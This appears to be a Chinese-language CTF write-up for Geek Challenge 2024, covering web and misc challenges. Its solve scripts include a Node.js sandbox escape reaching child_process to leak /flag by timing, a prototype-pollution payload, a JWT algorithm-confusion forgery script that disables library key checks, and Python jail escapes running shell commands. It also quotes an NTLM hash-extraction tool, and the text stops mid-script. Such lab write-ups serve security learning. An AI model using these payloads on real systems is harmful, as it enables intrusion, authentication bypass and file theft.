id="escapeSandbox-PLUS（复现）">escapeSandbox_PLUS（复现）</h2><p>这个是真弄不懂原理，先把payload放上来<br>Part1：</p><pre><code>username:ſycloverpassword:J1rrY</code></pre><p>Part2：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ses = requests.session()</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;connect.sid=s%3AfkMOAgnXVe1bL5LoJ2KnKe3sjwHIPlP4.m1w4YDm7xwFa5aytoMLXKOp%2BV30kp4JQCD7Ylz4ww0g&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://3000-fead7ddc-eb05-474f-9c78-ec5636d0eb66.challenge.ctfplus.cn/execute&quot;</span></span><br><span class="line">pos = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    strs = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;-&#125;_&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strs:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;code[]&quot;</span>: <span class="string">&quot;async function fn() &#123; (function stack() &#123; new Error().stack; stack(); &#125;)(); &#125; p = fn(); p.constructor = &#123; [Symbol.species]: class FakePromise &#123; constructor(executor) &#123; executor((x) =&gt; x, (err) =&gt; &#123; return err.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;sleep $(cat /flag| cut -c%s | tr %s 2)&#x27;); &#125;) &#125; &#125; &#125;; p.then();&quot;</span></span><br><span class="line">            % (<span class="built_in">str</span>(pos), i)</span><br><span class="line">        &#125;</span><br><span class="line">        t1 = time.time()</span><br><span class="line">        req1 = ses.post(url, headers=headers, data=data)</span><br><span class="line">        <span class="built_in">print</span>(req1.text)</span><br><span class="line">        t2 = time.time()</span><br><span class="line">        <span class="built_in">print</span>(i + <span class="built_in">str</span>(t2 - t1))</span><br><span class="line">        <span class="keyword">if</span> t2 - t1 &gt; <span class="number">2</span>:</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            flag += i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="ez-js（复现）">ez_js（复现）</h2><p>第一关js原型链污染</p><pre><code>&#123;&quot;username&quot;:&quot;Starven&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;__proto__&quot;:&#123;&quot;hasFlag&quot;:true&#125;&#125;</code></pre><p>第二关需要绕过逗号<br>用&amp;连接并用syc传参</p><pre><code>?syc=&#123;&quot;username&quot;:&quot;Starven&quot;&amp;syc=&quot;password&quot;:&quot;123456&quot;&amp;syc=&quot;hasFlag&quot;:true&#125;</code></pre><h2 id="jwt-pickle（复现）">jwt_pickle（复现）</h2><p><a href="https://github.com/nu11secur1ty/rsa_sign2n">https://github.com/nu11secur1ty/rsa_sign2n</a><br>docker环境配好</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 jwt_forgery.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6ImM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliIiwiaXNfYWRtaW4iOmZhbHNlfQ.jleYYWDC9AlFzuGZ6Gk7RkyBuHlF7QS97wPA_ycJBtNPa1_RGMa5nyOE0-yv_dto9WMSx_aJ4epZ69fjZ8ZD1le6Qoa9sRhRdzW8el6NterxfMWfsz35L651Y69I13xsjg8uGryEKPcKTa42VvtCxUICkflYBJL29hpNwVBPQtGYTUIyusr6OkLSNLRiF7GF4EEqiBKcXf69xpYoIBsIOjbaE-tVsbrbCVOwDOugyz5HRWAN9fqtlVzsla5rgXSzJeyudYqzGDcR7oXzRH4ApoP16MQ-Q4_q_363HVOpOzx20qGUxgLP6b3roC-PuNLUcJ_lyFYQlos6obLo22p1Og eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjIiLCJwYXNzd29yZCI6ImM4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjIiwiaXNfYWRtaW4iOmZhbHNlfQ.DZKzbWYUbQvzgnkXi3oem1dTUtunTNqFtNTXmJUKkWjUenZpZMXZ_z-8aIzvVocQlS9BRnzFe5rVqkgwlla7BQ_fxKMixMmLbtlJ3tTNYLI2C5GtB4MRoui8dtMZx0n2zM9e0NmTy-zs8yiuHA9odC6p-KRxSRVZyAtpCD4FtAl0pybgBaBgSdJnw7On7Gm5CqjtOXar9OPX2Xy5fTLGyzkGd0Xgrj8oGafI0R5c9AcTh_aagPNLqwQ8gdDPu3uVPQOfyYgL8tfxX7NlA1B5JO8VnrFGDPvuQzVSJZnANAGHIABl3jjAQHdG9Th9CWaOcp7Jxrkw_hYx7VZWS4980Q</span><br></pre></td></tr></table></figure><p>将出现的密钥一个个试，发现b305dd712d5d2378_65537_pkcs1.pem是我们求的公钥</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /tmp/docker</span><br><span class="line">docker <span class="built_in">cp</span> 68a13c73d848:/app/ /tmp/docker/68a13c73d848</span><br></pre></td></tr></table></figure><p>注意python库的jwt最新版已经弃用了pem 格式的公钥做为 HS256 的密钥<br>需要注释掉 jwt/algorithms.py中的raise InvalidKeyError部分</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_key</span>(<span class="params">self, key: <span class="built_in">str</span> | <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    key_bytes = force_bytes(key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if is_pem_format(key_bytes) or is_ssh_key(key_bytes):</span></span><br><span class="line">    <span class="comment">#     raise InvalidKeyError(</span></span><br><span class="line">    <span class="comment">#         &quot;The specified key is an asymmetric key or x509 certificate and&quot;</span></span><br><span class="line">    <span class="comment">#         &quot; should not be used as an HMAC secret.&quot;</span></span><br><span class="line">    <span class="comment">#     )</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_bytes</span><br></pre></td></tr></table></figure><p><a href="http://xn--jwt-t33e261p.py">jwt签名.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">publicKey = <span class="built_in">open</span>(<span class="string">&quot;./b305dd712d5d2378_65537_pkcs1.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">token = <span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICIxIiwgInBhc3N3b3JkIjogImM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliIiwgImlzX2FkbWluIjogZmFsc2UsICJleHAiOiAxNzMyNzY4MTc0fQ.bohRFPyPpuMxMIuCtShU63I7ms2w8ZcWgejI1BV2158&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    real = jwt.decode(token, publicKey, algorithms=[<span class="string">&quot;HS256&quot;</span>, <span class="string">&quot;RS256&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(real)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    exit(e)</span><br><span class="line">ss = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;is_admin&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1732768174</span>,</span><br><span class="line">&#125;</span><br><span class="line">token = jwt.encode(</span><br><span class="line">    ss,</span><br><span class="line">    publicKey,</span><br><span class="line">    algorithm=<span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>获取admin权限后然后就可以打pickle反弹shell了</p><h1 id="Misc">Misc</h1><h2 id="I-wanna-go-to-SYC">I_wanna_go_to_SYC</h2><p><a href="https://www.cnblogs.com/chrysanthemum/p/11986382.html#gallery-7">https://www.cnblogs.com/chrysanthemum/p/11986382.html#gallery-7</a><br>一开始没有发现save1，我是傻逼<br>根据这个payload把第三位加2就能直接到flag房<br><img src="/img/WP/GeekChallenge2024/save1.png" alt=""><br><img src="/img/WP/GeekChallenge2024/iwanna.png" alt=""></p><h2 id="Welcome-jail">Welcome_jail</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">22957</span>)</span><br><span class="line">cmd = <span class="string">&quot;cat /home/ctf/flag&quot;</span></span><br><span class="line">exp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">    exp += <span class="string">&quot;chr(&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(i)) + <span class="string">&quot;)+&quot;</span></span><br><span class="line">exp = exp.rstrip(<span class="string">&quot;+&quot;</span>).encode()  <span class="comment"># 去掉最后多余的 &quot;+&quot;</span></span><br><span class="line">payload = (</span><br><span class="line">    <span class="string">b&quot;print([].__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](%b).read())&quot;</span></span><br><span class="line">    % exp</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br></pre></td></tr></table></figure><h2 id="cimbar">cimbar</h2><p><a href="https://github.com/sz3/cimbar">https://github.com/sz3/cimbar</a><br>搜cimbar看到原理和给的图很相像，点进去得到cimbar的加密方式<br><a href="https://github.com/sz3/libcimbar/blob/master/DETAILS.md">https://github.com/sz3/libcimbar/blob/master/DETAILS.md</a><br><img src="/img/WP/GeekChallenge2024/cimbar.png" alt=""><br>照着上面输入就OK了</p><h2 id="ez-pcap-1">ez_pcap_1</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">strings flag.pcapng | grep <span class="string">&quot;SYC&#123;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/WP/GeekChallenge2024/pcap.png" alt=""></p><h2 id="Truth-of-Word">Truth of Word</h2><p><img src="/img/WP/GeekChallenge2024/word1.png" alt=""><br>flag1: SYC{W0rd_H@5<br><img src="/img/WP/GeekChallenge2024/word2.png" alt=""><br>flag2: @_Ama1n9_<br>把.docu后缀改为.zip，发现藏有flag03.png<br><img src="/img/WP/GeekChallenge2024/word3.png" alt=""><br>flag3: StrUCtu3e!}</p><h2 id="2024-geek-challenge-签到">2024 geek challenge! 签到</h2><p>签到</p><h2 id="doSomeMath">doSomeMath</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">white_List=[<span class="string">&quot;+&quot;</span>,<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;g&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;l&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;,&quot;</span>]</span><br><span class="line">flag=os.environ.get(<span class="string">&quot;GEEK_FLAG&quot;</span>) <span class="keyword">if</span> os.environ.get(<span class="string">&quot;GEEK_FLAG&quot;</span>)!=<span class="literal">None</span> <span class="keyword">else</span> <span class="string">&quot;SYC&#123;test&#125;&quot;</span></span><br><span class="line">banner=<span class="string">&#x27;&#x27;&#x27;     _      ____                       __  __       _   _</span></span><br><span class="line"><span class="string">  __| | ___/ ___|  ___  _ __ ___   ___|  \/  | __ _| |_| |__</span></span><br><span class="line"><span class="string"> / _` |/ _ \___ \ / _ \| &#x27;_ ` _ \ / _ \ |\/| |/ _` | __| &#x27;_ \\</span></span><br><span class="line"><span class="string">| (_| | (_) |__) | (_) | | | | | |  __/ |  | | (_| | |_| | | |</span></span><br><span class="line"><span class="string"> \__,_|\___/____/ \___/|_| |_| |_|\___|_|  |_|\__,_|\__|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s.isascii():</span><br><span class="line">        exit(<span class="string">&quot;Please input ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">not</span> <span class="keyword">in</span> white_List:</span><br><span class="line">            exit(<span class="string">&quot;hacker!!!!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;please do this math problem&quot;</span>)</span><br><span class="line"><span class="comment">#9872</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">input</span>(<span class="string">&quot;99*100^60= &quot;</span>)</span><br><span class="line">        waf(result)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="number">99</span> * <span class="number">100</span> ^ <span class="number">60</span> == <span class="built_in">eval</span>(result):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Congradulation!!!!! Here is your reward: &quot;</span> + flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not right&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>().__ge__(())</code> 可以构造出1，意思是()是否大于等于()。<br>接下来只要构造出9872就好，注意eval有字符长度限制</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">36582</span>)</span><br><span class="line">s = <span class="string">&quot;().__ge__(())&quot;</span>  <span class="comment"># 1</span></span><br><span class="line">s_2 = <span class="string">&quot;&quot;</span></span><br><span class="line">s_7 = <span class="string">&quot;&quot;</span></span><br><span class="line">s_8 = <span class="string">&quot;&quot;</span></span><br><span class="line">s_9 = <span class="string">&quot;&quot;</span></span><br><span class="line">s_10 = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    s_2 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_2 = s_2[:-<span class="number">1</span>]</span><br><span class="line">s_2 = <span class="string">&quot;(&quot;</span> + s_2 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    s_7 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_7 = s_7[:-<span class="number">1</span>]</span><br><span class="line">s_7 = <span class="string">&quot;(&quot;</span> + s_7 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    s_8 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_8 = s_8[:-<span class="number">1</span>]</span><br><span class="line">s_8 = <span class="string">&quot;(&quot;</span> + s_8 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    s_9 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_9 = s_9[:-<span class="number">1</span>]</span><br><span class="line">s_9 = <span class="string">&quot;(&quot;</span> + s_9 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    s_10 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_10 = s_10[:-<span class="number">1</span>]</span><br><span class="line">s_10 = <span class="string">&quot;(&quot;</span> + s_10 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="comment"># payload=9*10*10*10+8*10*10+7*10+2</span></span><br><span class="line"><span class="comment"># print(eval(s_2))</span></span><br><span class="line"><span class="comment"># print(eval(s_7))</span></span><br><span class="line"><span class="comment"># print(eval(s_8))</span></span><br><span class="line"><span class="comment"># print(eval(s_9))</span></span><br><span class="line"><span class="comment"># print(eval(s_10))</span></span><br><span class="line">payload = s_9 + <span class="string">&quot;*&quot;</span> + s_10 + <span class="string">&quot;*&quot;</span> + s_10 + <span class="string">&quot;*&quot;</span> + s_10</span><br><span class="line">payload += <span class="string">&quot;+&quot;</span> + s_8 + <span class="string">&quot;*&quot;</span> + s_10 + <span class="string">&quot;*&quot;</span> + s_10</span><br><span class="line">payload += <span class="string">&quot;+&quot;</span> + s_7 + <span class="string">&quot;*&quot;</span> + s_10</span><br><span class="line">payload += <span class="string">&quot;+&quot;</span> + s_2</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br><span class="line"><span class="comment"># 9872</span></span><br></pre></td></tr></table></figure><h2 id="hard-jail">hard_jail</h2><p>为了构造斜杠卡了好久，不同版本doc文档不一样是最恶心的。<br>出题人催促我们换新版本（确信）<br>原理就是把__file__换成/flag，利用show读取</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(os.__doc__)</span><br><span class="line">i = <span class="number">40</span></span><br><span class="line">io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">25584</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;import os&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;a=os.__doc__&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;b=a[424]+a[42]+a[4]+a[51]+a[9]+a[424]+a[89]+a[6]&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;b+=a[12]+a[424]+a[12]+a[83]+a[43]+a[36]&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;__file__=b&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;show&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br><span class="line"><span class="comment"># import os</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># str = &quot;/home/ctf/flag&quot;</span></span><br><span class="line"><span class="comment"># for i in str:</span></span><br><span class="line"><span class="comment">#     print(&quot;a[&quot;, end=&quot;&quot;)</span></span><br><span class="line"><span class="comment">#     print(os.__doc__.find(i), end=&quot;&quot;)</span></span><br><span class="line"><span class="comment">#     print(&quot;]+&quot;, end=&quot;&quot;)</span></span><br></pre></td></tr></table></figure><p>出题人预期解：<br>无括号绕过</p><pre><code>help.__class__.__eq__=exechelp.__class__.__getattribute__=inputhelp==help.a# 进入input__import__('os').system('cat /home/ctf/flag')</code></pre><h2 id="舔狗的觉醒">舔狗的觉醒</h2><p>ARCHPR跑出压缩包密码为8个8（竟然有8位！）<br>看文档开头 05 b4 30 40判断是字节的两位之间调换了位置，能恢复成zip文件<br><a href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a>  用这个的 -re 参数恢复<br>解压发现flag.pdf文件，需要移开图片，但pdf上了锁。<br>搜索pdf解锁找到一个在线解锁pdf的网站<br><a href="https://www.ilovepdf.com/zh-cn/unlock_pdf">https://www.ilovepdf.com/zh-cn/unlock_pdf</a><br>用这个打开 flag_unlocked.pdf 移开图片拿到flag<br><img src="/img/WP/GeekChallenge2024/hero.png" alt=""></p><h2 id="雪">雪</h2><p>snow加密。压缩包密码是最后的base64编码。<br>用WaterMarkH.exe提取syclover_WaterMark.png<br><img src="/img/WP/GeekChallenge2024/watermark.png" alt=""><br>得到 snow 解密的密码为Th1si4st8eK3y<br><img src="/img/WP/GeekChallenge2024/snow.png" alt=""></p><h2 id="ez-climbstairs">ez_climbstairs</h2><p>这题我环境有问题，跑不出来，交给队友跑的，然后他交上flag后我又能跑了。。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sys.set_int_max_str_digits(<span class="number">100000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">climb_stairs</span>(<span class="params">n</span>):</span><br><span class="line">    dp = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">    dp[<span class="number">2</span>] = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, n + <span class="number">1</span>):</span><br><span class="line">        dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>] + dp[i - <span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> dp[n]</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">20140</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>].decode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解析出的楼梯数: <span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line">    payload = <span class="built_in">str</span>(climb_stairs(num)).encode()</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    response = io.recvline().decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;服务器返回: <span class="subst">&#123;response&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br></pre></td></tr></table></figure><h2 id="ez-jpg">ez_jpg</h2><p>base64编码后发现是个以9DFF开头的十六进制字符串<br>根据题目名称判断为jpg结尾FFD9经过了反转<br><a href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a> 用工具的-r参数反转得到一个jpg文件<br><img src="/img/WP/GeekChallenge2024/reverse.jpg" alt=""><br>最后在随波逐流找到了jpg修改高度<br><img src="/img/WP/GeekChallenge2024/suijpg.png" alt=""><br>图片增加高度后拿到flag<br><img src="/img/WP/GeekChallenge2024/reverse2.jpg" alt=""></p><h2 id="Secret-of-Starven（复现）">Secret of Starven（复现）</h2><p>涉及SMB2协议，哈希值格式为<br>username::domain:ntlmv2_response.chall:ntproofstr:不包含ntproofstr的ntlmv2_response值<br>手动查找略<br>这里可以用一个自动化脚本提取流量的hash值 <a href="https://github.com/mlgualtieri/NTLMRawUnhide">https://github.com/mlgualtieri/NTLMRawUnhide</a><br><a href="http://NTLMRawUnhide.py">NTLMRawUnhide.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># NTLMRawUnhide.py is a Python3 script designed to parse network packet capture</span></span><br><span class="line"><span class="comment"># files and extract NTLMv2 hashes in a crackable format. The following binary</span></span><br><span class="line"><span class="comment"># network packet capture formats are supported: *.pcap *.pcapng *.cap *.etl</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This tool was developed to extract NTLMv2 hashes from files generated by</span></span><br><span class="line"><span class="comment"># native Windows binaries like NETSH.EXE and PKTMON.EXE without conversion.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage: NTLMRawUnhide.py -i &lt;inputfile&gt; [-o &lt;outputfile&gt;] [-f] [-h] [-q] [-v]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Methods to create compatible packet capture files:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &gt; Wireshark: Set capture filter as &quot;tcp port 445&quot;; Save as .pcapng</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &gt; tcpdump -i eth0 -w capture.pcap &quot;port 445&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &gt; netsh.exe trace start persistent=yes capture=yes TCP.AnyPort=445 \</span></span><br><span class="line"><span class="comment">#        tracefile=C:\Users\Public\capture.etl</span></span><br><span class="line"><span class="comment">#   netsh.exe trace stop</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &gt; pktmon.exe filter add SMB -p 445</span></span><br><span class="line"><span class="comment">#   :: List all filters</span></span><br><span class="line"><span class="comment">#   pktmon.exe filter list</span></span><br><span class="line"><span class="comment">#   :: Find id of the network adapter (example &gt; Id: 9)</span></span><br><span class="line"><span class="comment">#   pktmon.exe comp list</span></span><br><span class="line"><span class="comment">#   :: pktmon.exe start --etw -p 0 -c [Adapter ID]</span></span><br><span class="line"><span class="comment">#   pktmon.exe start --etw -p 0 -c 9</span></span><br><span class="line"><span class="comment">#   :: Will create the file PktMon.etl in current directory</span></span><br><span class="line"><span class="comment">#   pktmon.exe stop</span></span><br><span class="line"><span class="comment">#   :: Cleanup</span></span><br><span class="line"><span class="comment">#   pktmon.exe filter remove</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author:   Mike Gualtieri</span></span><br><span class="line"><span class="comment"># Blog:     https://www.mike-gualtieri.com</span></span><br><span class="line"><span class="comment"># Twitter:  https://twitter.com/mlgualtieri</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># GitHub:   https://github.com/mlgualtieri/NTLMRawUnhide</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The following URL was very helpful when building this tool:</span></span><br><span class="line"><span class="comment">#     The NTLM Authentication Protocol and Security Support Provider</span></span><br><span class="line"><span class="comment">#     http://davenport.sourceforge.net/ntlm.html</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys, getopt, time</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The decode_string() function was taken from:</span></span><br><span class="line"><span class="comment"># https://github.com/b17zr/ntlm_challenger</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_string</span>(<span class="params">byte_string</span>):</span><br><span class="line">    <span class="keyword">return</span> byte_string.decode(<span class="string">&quot;UTF-8&quot;</span>).replace(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The decode_int() function was taken from:</span></span><br><span class="line"><span class="comment"># https://github.com/b17zr/ntlm_challenger</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_int</span>(<span class="params">byte_string</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(byte_string, <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Output our hash to specified outfile</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeOutfile</span>(<span class="params">output, outstr</span>):</span><br><span class="line">    outstr = outstr + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    f = <span class="built_in">open</span>(output, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(outstr)</span><br><span class="line">    